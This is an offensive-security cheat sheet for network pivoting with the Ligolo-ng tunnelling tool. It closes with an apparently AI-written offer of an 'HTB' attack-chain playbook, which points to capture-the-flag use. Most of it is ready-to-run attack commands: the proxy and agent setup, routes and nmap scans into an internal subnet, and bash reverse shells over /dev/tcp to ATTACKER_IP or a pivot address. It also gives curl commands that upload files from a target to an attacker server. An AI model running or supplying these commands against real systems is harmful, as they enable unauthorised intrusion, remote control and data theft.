


> [!ABSTRACT]  
> Ligolo-ng = **VPN-style pivoting tool**  
> Gives you **direct routing into internal networks**

```text
Attacker (proxy) ⇄ Victim (agent) → Internal network
```

---

# 🚀 1. Start Everything

## 🔹 Attacker (Proxy)

```bash
ligolo-proxy -selfcert
```

---

## 🔹 Victim (Agent)

```bash
./ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
```

---

## 🔹 Inside Ligolo CLI

```text
session
session 1
start
```

---

# 🌐 2. Create Tunnel Interface (CRITICAL)

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

---

# 🧭 3. Add Route (THIS IS THE MAGIC)

> [!IMPORTANT]  
> Route internal traffic through Ligolo

```bash
sudo ip route add 10.10.0.0/24 dev ligolo
```

---

# 🔍 4. Pivot Test

```bash
ping 10.10.0.5
nmap -sT 10.10.0.0/24
```

---

# 🔁 5. Reverse Shell Routing

> [!ABSTRACT]  
> Decide where shell connects based on reachability

---

## ✅ Case 1: Internal CAN reach attacker

Listener:

```bash
nc -lvnp 4444
```

Shell:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

---

## ❌ Case 2: Internal CANNOT reach attacker

> [!TIP]  
> Use Ligolo listener

Inside Ligolo:

```text
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
```

Attacker:

```bash
nc -lvnp 4444
```

Target connects to pivot:

```bash
bash -c 'bash -i >& /dev/tcp/PIVOT_INTERNAL_IP/4444 0>&1'
```

---

# 📁 6. File Transfer

---

## 🔹 Download from attacker (simple)

Attacker:

```bash
python3 -m http.server 8000
```

Target:

```bash
wget http://ATTACKER_IP:8000/file
```

---

## 🔹 If direct access fails (use Ligolo)

Inside Ligolo:

```text
listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000
```

Target:

```bash
wget http://PIVOT_INTERNAL_IP:8000/file
```

---

## 🔹 Upload to attacker

Attacker:

```bash
pip3 install uploadserver
python3 -m uploadserver 9000
```

Target:

```bash
curl -F 'files=@file.txt' http://ATTACKER_IP:9000/upload
```

---

## 🔹 Upload via pivot

```text
listener_add --addr 0.0.0.0:9000 --to 127.0.0.1:9000
```

```bash
curl -F 'files=@file.txt' http://PIVOT_INTERNAL_IP:9000/upload
```

---

# ⚡ 7. Full Flow

```text
Start proxy → Run agent → session → start
→ Create tun → Add route → Pivot
→ Reverse shell / Transfer files
```

---

# ⚠️ 8. Common Mistakes

> [!WARNING]

- Forgot TUN interface
    
- Wrong subnet in route
    
- Listener not set
    
- Internal host can’t reach attacker
    
- Firewall blocking ports
    

---

# 🧠 Golden Rule

> [!SUCCESS]

```text
If reachable → connect to ATTACKER_IP
If not reachable → connect to PIVOT_IP (use listener_add)
```

---

# 🧪 Quick Debug

```bash
ip route
ip addr show ligolo
ping TARGET
nc -lvnp 4444
```

Ligolo:

```text
session
listener_list
listener_add
```

---

# 🧠 Mental Model

```text
Ligolo = you plugged your laptop into the victim’s network
```

---

If you want next, I can make you a **🔥 HTB real-world pivot playbook (step-by-step attack chain)** or a **Ligolo vs Chisel vs SSH tunneling breakdown** — those are game changers.